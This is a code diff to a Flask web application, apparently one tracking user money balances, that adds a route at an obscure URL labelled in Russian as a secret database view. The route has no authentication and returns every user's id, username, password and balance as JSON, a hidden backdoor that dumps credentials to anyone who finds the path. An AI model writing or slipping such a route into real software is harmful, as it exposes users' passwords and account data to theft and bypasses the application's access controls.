@@ -85,6 +85,36 @@ def index():
 def serve_static(path):
     return send_from_directory('.', path)
 
+# --- СЕКРЕТНЫЙ ПРОСМОТР БАЗЫ ДАННЫХ ЧЕРЕЗ БРАУЗЕР ---
+@app.route('/secret-db-view-xyz')
+def secret_db_view():
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        
+        # Читаем всех пользователей
+        cursor.execute("SELECT id, username, password, balance FROM users ORDER BY id ASC;")
+        rows = cursor.fetchall()
+        
+        # Получаем имена колонок
+        colnames = [desc[0] for desc in cursor.description]
+        
+        cursor.close()
+        conn.close()
+        
+        # Собираем данные в красивый список
+        users_list = []
+        for row in rows:
+            users_list.append(dict(zip(colnames, row)))
+            
+        return jsonify({
+            "status": "success",
+            "total_users": len(users_list),
+            "users": users_list
+        }), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 @app.route('/add_money', methods=['POST'])
 def add_money():
     data = request.json
